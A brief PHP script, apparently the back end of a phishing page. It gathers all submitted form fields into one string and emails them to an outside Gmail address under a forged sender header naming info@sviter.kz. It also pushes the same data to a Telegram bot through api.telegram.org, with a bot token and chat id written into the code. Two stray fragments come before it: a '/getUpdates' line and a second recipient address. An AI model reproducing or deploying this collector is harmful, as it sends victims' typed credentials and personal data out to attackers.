/getUpdates
$to = "petr.pawlikov@yandex.ru";
<?php
$to = "be4huu@gmail.com";
    $subject = "******";
    $message = implode (" | ", $_POST );
    $headers = "From: info@sviter.kz\r\nReply-to: info@sviter.kz\r\nContent-type: text/plain; charset=utf-8\r\n";
    mail($to, $subject, $message, $headers);
		file_get_contents('https://api.telegram.org/bot808970621:AAEaA0jzGTzo5yKb4AQT0Pf-Pm3n-eEt63U/sendMessage?chat_id=666543398&text=888' . $message)
?>